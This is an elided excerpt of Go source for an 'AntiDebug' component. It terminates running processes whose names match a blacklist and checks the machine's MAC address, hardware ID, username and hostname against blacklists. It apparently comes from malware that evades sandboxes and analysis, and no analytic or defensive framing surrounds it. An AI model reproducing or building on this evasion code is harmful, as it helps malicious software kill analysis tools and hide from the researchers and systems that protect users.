...
func (ad *AntiDebug) checkProcess() bool {
	for _, procstr := range ad.blacklistedProcesses {
		procs, _ := process.Processes()
		for _, proc := range procs {
			name, _ := proc.Name()
			if strings.Contains(strings.ToLower(name), procstr) {
				proc.Terminate()
			}
...
func (ad *AntiDebug) getNetwork() bool {
	...
	if contains(ad.blackListedMacs, mac) {
		return true
	}
...
func (ad *AntiDebug) getSystem() bool {
	...
	for _, i := range ad.blackListedHWIDS {
		if hwid == i || username == i || hostname == i {
			return true
		}
	}
